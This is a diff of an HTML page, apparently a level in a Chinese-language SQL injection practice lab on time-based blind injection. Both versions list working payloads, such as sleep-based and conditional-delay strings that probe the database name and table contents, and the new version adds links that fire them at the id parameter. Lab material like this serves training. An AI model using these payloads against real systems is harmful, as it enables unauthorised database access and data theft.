@@ -57,64 +57,59 @@
         </div>
 
         <div class="col-lg-4">
-            <div class="card info-card">
-                <div class="card-header">
-                    <h5><i class="fas fa-lightbulb"></i> 漏洞分析</h5>
+            <div class="card">
+                <div class="card-header bg-success text-white">
+                    <h5>
+                        <i class="fas fa-lightbulb me-2"></i>
+                        注入提示
+                    </h5>
                 </div>
                 <div class="card-body">
-                    <h6>漏洞类型：</h6>
-                    <p>时间盲注（Time-based Blind SQL Injection）</p>
+                    <h6><i class="fas fa-bug me-2 text-danger"></i>漏洞分析</h6>
+                    <p class="small">此关卡存在时间盲注漏洞，无任何显示输出，只能通过响应时间差异来判断SQL查询结果。</p>
                     
-                    <h6>特点：</h6>
-                    <ul>
-                        <li>无任何显示输出</li>
-                        <li>通过响应时间判断</li>
-                        <li>使用延迟函数</li>
-                        <li>最隐蔽的注入方式</li>
-                    </ul>
-
-                    <h6>测试方法：</h6>
-                    <ol>
-                        <li>测试延迟函数</li>
-                        <li>构造条件延迟</li>
-                        <li>观察响应时间</li>
-                        <li>逐字符猜测</li>
+                    <h6><i class="fas fa-tools me-2 text-primary"></i>测试步骤</h6>
+                    <ol class="small">
+                        <li>测试延迟函数：<code>sleep()</code></li>
+                        <li>构造条件延迟语句</li>
+                        <li>观察响应时间差异</li>
+                        <li>逐字符猜测敏感数据</li>
                     </ol>
-                </div>
-            </div>
 
-            <div class="card payload-card mt-3">
-                <div class="card-header">
-                    <h5><i class="fas fa-code"></i> 常用载荷</h5>
-                </div>
-                <div class="card-body">
-                    <h6>基础延迟：</h6>
-                    <code>1' and sleep(5)--+</code><br>
-                    <code>1'; waitfor delay '00:00:05'--</code><br><br>
-                    
-                    <h6>条件延迟：</h6>
-                    <code>1' and if(1=1,sleep(5),0)--+</code><br>
-                    <code>1' and if(length(database())>5,sleep(5),0)--+</code><br><br>
-                    
-                    <h6>数据提取：</h6>
-                    <code>1' and if(ascii(substr(database(),1,1))>97,sleep(5),0)--+</code><br>
-                    <code>1' and if((select count(*) from users)>0,sleep(5),0)--+</code>
-                </div>
-            </div>
+                    <h6><i class="fas fa-code me-2 text-info"></i>示例Payload</h6>
+                    <div class="bg-dark text-light p-2 rounded small mb-2">
+                        <code>1' and sleep(3)--</code>
+                    </div>
+                    <div class="bg-dark text-light p-2 rounded small mb-2">
+                        <code>1' and if(1=1,sleep(3),0)--</code>
+                    </div>
+                    <div class="bg-dark text-light p-2 rounded small">
+                        <code>1' and if(length(database())>5,sleep(3),0)--</code>
+                    </div>
 
-            <div class="card tips-card mt-3">
-                <div class="card-header">
-                    <h5><i class="fas fa-tools"></i> 工具推荐</h5>
-                </div>
-                <div class="card-body">
-                    <ul>
-                        <li><strong>SQLMap:</strong> 自动化时间盲注</li>
-                        <li><strong>Burp Suite:</strong> 手工测试</li>
-                        <li><strong>自定义脚本:</strong> 批量测试</li>
+                    <h6 class="mt-3"><i class="fas fa-clock me-2 text-warning"></i>时间盲注特点</h6>
+                    <ul class="small mb-0">
+                        <li>最隐蔽的注入方式</li>
+                        <li>通过时间延迟判断</li>
+                        <li>需要耐心等待响应</li>
+                        <li>适用于严格过滤场景</li>
                     </ul>
-                    
-                    <div class="alert alert-info mt-2">
-                        <small><strong>提示：</strong> 时间盲注通常是最后的选择，当其他注入方式都无效时使用。</small>
+                </div>
+            </div>
+
+            <div class="card mt-3">
+                <div class="card-header bg-warning text-dark">
+                    <h6>
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        快速测试
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="d-grid gap-2">
+                        <a href="?id=1" class="btn btn-outline-primary btn-sm">正常查询</a>
+                        <a href="?id=1'" class="btn btn-outline-danger btn-sm">触发错误</a>
+                        <a href="?id=1' and sleep(3)--" class="btn btn-outline-warning btn-sm">时间延迟</a>
+                        <a href="?id=1' and if(1=1,sleep(3),0)--" class="btn btn-outline-success btn-sm">条件延迟</a>
                     </div>
                 </div>
             </div>
